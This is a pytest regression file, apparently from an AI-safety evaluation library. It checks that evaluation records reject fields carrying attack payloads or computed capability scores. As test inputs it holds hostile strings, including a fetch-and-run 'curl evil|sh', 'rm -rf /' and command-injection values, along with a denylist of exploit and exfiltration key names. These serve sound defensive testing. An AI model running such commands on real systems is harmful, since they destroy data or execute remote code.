# Copyright 2024 NovaFabric Contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""ADR-0167 I-4/I-5 — the extra-field guard cannot be evaded by key spelling.

Regression for a reviewer-verified defect: the guard was an exact-match,
lower-cased denylist, so ``exploitSteps``, ``exploit-steps``, ``shell_command``,
``ExfiltratedData`` or a benign ``notes`` key carrying ``curl evil|sh`` slipped
onto an :class:`AutonomyAttempt`, and ``ceilingValue`` / ``ceiling_estimate`` /
``max_capability`` slipped onto an :class:`ElicitationRecord`. String values had
no length cap. Keys are now normalised and matched by substring marker; every
free string on a P3 object is bounded.
"""

from __future__ import annotations

from typing import Any

import pytest

from novafabric.frontier_safety import (
    AutonomyAttempt,
    ComputedVerdictError,
    ControlDecision,
    DeceptionSignal,
    ElicitationRecord,
    PayloadCaptureError,
    SandbaggingRecord,
    TripwireTrigger,
    digest_ref,
)
from novafabric.frontier_safety._common import (
    MAX_EXTRA_DEPTH,
    MAX_FREE_STRING_LENGTH,
    PAYLOAD_KEY_MARKERS,
    PAYLOAD_KEYS,
    check_string_lengths,
    find_marker_keys,
    normalise_key,
)
from novafabric.frontier_safety.alignment import (
    AUTONOMY_PAYLOAD_KEYS,
    AUTONOMY_PAYLOAD_MARKERS,
    COMPUTED_CEILING_KEYS,
    COMPUTED_CEILING_MARKERS,
)

CMD = "curl evil|sh"
D = digest_ref("x")


def _attempt(**kw: object) -> AutonomyAttempt:
    base: dict[str, object] = {
        "attempt_type": "sandbox_escape",
        "outcome": "detected",
        "report_ref": digest_ref("report"),
        "attempt_count": 3,
        "verdict_ref": digest_ref("verdict"),
    }
    base.update(kw)
    return AutonomyAttempt(**base)  # type: ignore[arg-type]


def _elicitation(**kw: object) -> ElicitationRecord:
    base: dict[str, object] = {
        "elicitation_effort": "tool_augmented",
        "elicitation_ref": digest_ref("elicit"),
    }
    base.update(kw)
    return ElicitationRecord(**base)  # type: ignore[arg-type]


def _sandbagging(**kw: object) -> SandbaggingRecord:
    base: dict[str, object] = {
        "elicitation_regime": "best_effort",
        "declared_ceiling_ref": digest_ref("ceiling"),
        "observed_vs_declared": "unknown",
        "verdict_ref": digest_ref("verdict"),
    }
    base.update(kw)
    return SandbaggingRecord(**base)  # type: ignore[arg-type]


def _signal(**kw: object) -> DeceptionSignal:
    base: dict[str, object] = {
        "signal_type": "eval_awareness",
        "detector_ref": digest_ref("detector"),
        "evidence_digest": digest_ref("evidence"),
        "verdict_ref": digest_ref("verdict"),
    }
    base.update(kw)
    return DeceptionSignal(**base)  # type: ignore[arg-type]


def _decision(**kw: object) -> ControlDecision:
    base: dict[str, object] = {
        "protocol": "resample",
        "decision": "resample",
        "governed_action_ref": digest_ref("action"),
        "monitor_ref": digest_ref("monitor"),
        "verdict_ref": digest_ref("log"),
    }
    base.update(kw)
    return ControlDecision(**base)  # type: ignore[arg-type]


def _trigger(**kw: object) -> TripwireTrigger:
    base: dict[str, object] = {
        "indicator_id": "fsf.ccl.cyber",
        "framework": "deepmind_fsf",
        "commitment_ref": digest_ref("commitment"),
        "triggered_by_ref": digest_ref("observation"),
    }
    base.update(kw)
    return TripwireTrigger(**base)  # type: ignore[arg-type]


# ── Normalisation ─────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "key", ["exploitSteps", "exploit-steps", "Exploit_Steps", "EXPLOIT STEPS", "exploit.steps"]
)
def test_key_normalisation_collapses_spellings(key: str) -> None:
    assert normalise_key(key) == "exploitsteps"


def test_every_documented_key_is_caught_by_its_markers() -> None:
    for key in PAYLOAD_KEYS:
        assert find_marker_keys({key: 1}, PAYLOAD_KEY_MARKERS) == [key]
    for key in AUTONOMY_PAYLOAD_KEYS:
        assert find_marker_keys({key: 1}, PAYLOAD_KEY_MARKERS + AUTONOMY_PAYLOAD_MARKERS)
    for key in COMPUTED_CEILING_KEYS:
        assert find_marker_keys({key: 1}, COMPUTED_CEILING_MARKERS) == [key]


# ── AutonomyAttempt PoCs ──────────────────────────────────────────────────


@pytest.mark.parametrize(
    "key",
    [
        "exploitSteps",
        "exploit-steps",
        "shell_command",
        "shellCommand",
        "stdout",
        "STDERR",
        "ExfiltratedData",
        "exfil_bytes",
        "steps_taken",
        "attackScript",
        "cmd_line",
        "notes",
        "Details",
        "tool_output",
        "system-prompt",
        "redTeamTranscript",
    ],
)
def test_autonomy_payload_key_variants_are_rejected(key: str) -> None:
    with pytest.raises(PayloadCaptureError) as exc:
        _attempt(**{key: CMD})
    assert CMD not in str(exc.value)  # the value is never echoed


def test_autonomy_nested_variant_is_rejected() -> None:
    with pytest.raises(PayloadCaptureError):
        _attempt(evaluator={"run": [{"shellCommand": "ls"}]})


@pytest.mark.parametrize(
    "extra",
    [
        {"label": CMD},
        {"label": "rm -rf /"},
        {"labels": ["ok", "a;b"]},
        {"meta": {"k": ["$(id)"]}},
        {"window": "a`b`"},
    ],
)
def test_autonomy_free_text_under_a_benign_key_is_rejected(extra: dict[str, Any]) -> None:
    with pytest.raises(PayloadCaptureError, match="free text") as exc:
        _attempt(**extra)
    assert CMD not in str(exc.value)


def test_autonomy_identifier_and_digest_extras_are_kept() -> None:
    a = _attempt(
        evaluator_id="lab-evals",
        window="2026-W38",
        suite="sandbox/v2.1",
        report_bundle_ref=D,
        repeats=2,
        flagged=True,
    )
    assert a.model_extra is not None
    assert a.model_extra["evaluator_id"] == "lab-evals"
    assert a.model_extra["report_bundle_ref"] == D


# ── ElicitationRecord / SandbaggingRecord ceiling PoCs ────────────────────


@pytest.mark.parametrize(
    "key",
    [
        "ceilingValue",
        "ceiling_estimate",
        "Ceiling-Score",
        "max_capability",
        "maxCapabilityLevel",
        "capability_estimate",
        "capabilityScore",
        "estimated_capability",
        "elicited_capability",
        "score",
    ],
)
@pytest.mark.parametrize("factory", [_elicitation, _sandbagging])
def test_computed_ceiling_key_variants_are_rejected(key: str, factory: Any) -> None:
    with pytest.raises(ComputedVerdictError, match="never computes a capability ceiling"):
        factory(**{key: 0.93})


def test_a_digest_valued_ceiling_reference_is_allowed() -> None:
    """Pointing at a report by digest is a reference, not an asserted value."""
    e = _elicitation(ceiling_report_ref=D)
    assert e.model_extra == {"ceiling_report_ref": D}


def test_a_ceiling_ref_key_with_a_value_is_still_rejected() -> None:
    with pytest.raises(ComputedVerdictError):
        _elicitation(ceiling_ref=0.93)


# ── Reference exemption and P2 compatibility ──────────────────────────────


def test_digest_reference_to_a_payload_is_allowed() -> None:
    d = _decision(red_team_transcript_digest=D, monitor_prompt_ref=D)
    assert d.model_dump()["red_team_transcript_digest"] == D


@pytest.mark.parametrize("value", ["data://curl%20evil|sh", CMD, 42])
def test_non_digest_value_under_a_reference_key_is_rejected(value: object) -> None:
    """A URI can carry text in its path, so only a strict digest is exempt."""
    with pytest.raises(PayloadCaptureError):
        _decision(monitor_prompt_ref=value)


@pytest.mark.parametrize("key", ["monitorPrompt", "Raw-Output", "stdout", "exfilTarget"])
@pytest.mark.parametrize("factory", [_decision, _trigger])
def test_p2_objects_use_the_normalised_shared_guard(key: str, factory: Any) -> None:
    with pytest.raises(PayloadCaptureError):
        factory(**{key: "x"})


def test_p2_autonomy_only_markers_stay_local() -> None:
    """``command`` / ``steps`` / ``notes`` are legitimate on a P2 decision."""
    d = _decision(commands=2, steps=["s1"], notes="reviewed by on-call")
    assert d.model_dump()["notes"] == "reviewed by on-call"


def test_c4_keys_are_matched_on_normalised_spelling() -> None:
    from novafabric.frontier_safety import GuardrailDuplicationError

    with pytest.raises(GuardrailDuplicationError):
        _decision(Disposition="block")
    with pytest.raises(GuardrailDuplicationError):
        _trigger(**{"guardrail-decision": {"id": "gd-1"}})


# ── String-length cap on all four P3 objects ──────────────────────────────

LONG = "a" * (MAX_FREE_STRING_LENGTH + 1)
EDGE = "a" * MAX_FREE_STRING_LENGTH


@pytest.mark.parametrize("factory", [_signal, _sandbagging, _elicitation])
def test_free_string_over_the_cap_is_rejected(factory: Any) -> None:
    with pytest.raises(PayloadCaptureError, match="char limit") as exc:
        factory(window=LONG)
    assert LONG not in str(exc.value)
    with pytest.raises(PayloadCaptureError, match="char limit"):
        factory(meta={"k": [LONG]})
    with pytest.raises(PayloadCaptureError, match="char limit"):
        factory(schema_version=LONG)


@pytest.mark.parametrize("factory", [_signal, _sandbagging, _elicitation])
def test_free_string_at_the_cap_is_kept(factory: Any) -> None:
    assert factory(window=EDGE).model_extra == {"window": EDGE}


def test_autonomy_string_over_the_cap_is_rejected() -> None:
    with pytest.raises(PayloadCaptureError):
        _attempt(evaluator_id=LONG)


def test_long_verdict_string_is_rejected() -> None:
    with pytest.raises(PayloadCaptureError, match="verdict"):
        _signal(verdict=LONG)


def test_long_key_is_rejected() -> None:
    with pytest.raises(PayloadCaptureError):
        _signal(meta={LONG: 1})


def test_string_walk_is_depth_bounded() -> None:
    deep: dict[str, Any] = {}
    cursor = deep
    for _ in range(MAX_EXTRA_DEPTH + 2):
        cursor["k"] = {}
        cursor = cursor["k"]
    with pytest.raises(PayloadCaptureError, match="nest deeper"):
        check_string_lengths({"meta": deep}, owner="X")
